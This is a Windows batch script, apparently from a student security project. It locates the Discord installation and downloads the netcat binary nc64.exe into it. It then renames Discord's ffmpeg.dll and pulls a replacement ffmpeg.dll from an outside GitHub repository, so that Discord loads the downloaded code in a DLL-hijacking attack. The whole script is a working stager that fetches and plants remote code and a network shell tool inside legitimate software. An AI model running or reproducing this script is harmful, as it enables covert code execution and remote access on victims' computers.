@echo off

REM Set the shortcut path
set "shortcut_path=%UserProfile%\Desktop\Discord.lnk"

REM Extract the target path from the shortcut using PowerShell
for /F "tokens=*" %%i in ('powershell -Command "$Shell = New-Object -ComObject WScript.Shell; $Shortcut = $Shell.CreateShortcut('%shortcut_path%'); Write-Host $Shortcut.TargetPath"') do set "discord_exe_path=%%i"

REM Echo the Discord EXE path (for debugging)
echo Discord Executable Path: %discord_exe_path%

REM Extract the base path (C:\Users\student\AppData\Local\Discord)
for %%a in ("%discord_exe_path%") do set "discord_base_path=%%~dpa"

REM Construct the desired path.  We assume a version like app-1.0.9191
set "desired_path=%discord_base_path%app-1.0.9191"

REM Echo the desired path (for debugging)
echo Desired Path: %desired_path%

REM Check if the directory exists before attempting to change to it
if exist "%desired_path%" (
    echo Changing directory to: %desired_path%
    cd /d "%desired_path%"
    echo Successfully changed directory.

    REM Download nc64.exe using curl
    echo Downloading nc64.exe...
    curl -L -o "nc64.exe" "https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe"
    if %errorlevel% neq 0 (
        echo Failed to download nc64.exe.  Exiting.
        exit /b %errorlevel%
    ) else (
        echo Successfully downloaded nc64.exe.
    )

    REM Rename ffmpeg.dll to ffmpeg_orig.dll
    echo Renaming ffmpeg.dll to ffmpeg_orig.dll...
    if exist "ffmpeg.dll" (
        ren "ffmpeg.dll" "ffmpeg_orig.dll"
        if %errorlevel% neq 0 (
            echo Failed to rename ffmpeg.dll.  Exiting.
            exit /b %errorlevel%
        ) else (
            echo Successfully renamed ffmpeg.dll to ffmpeg_orig.dll.
        )
    ) else (
        echo ffmpeg.dll not found.  Continuing.
    )

    REM Download the new ffmpeg.dll
    echo Downloading ffmpeg.dll...
    curl -L -o "ffmpeg.dll" "https://raw.githubusercontent.com/vien2024/NT230-project/refs/heads/main/ffmpeg.dll"
    if %errorlevel% neq 0 (
        echo Failed to download ffmpeg.dll. Exiting.
        exit /b %errorlevel%
    )
    else (
        echo Successfully downloaded ffmpeg.dll.
    )

) else (
    echo Directory not found: %desired_path%
    echo Exiting script.
    exit /b 1
)
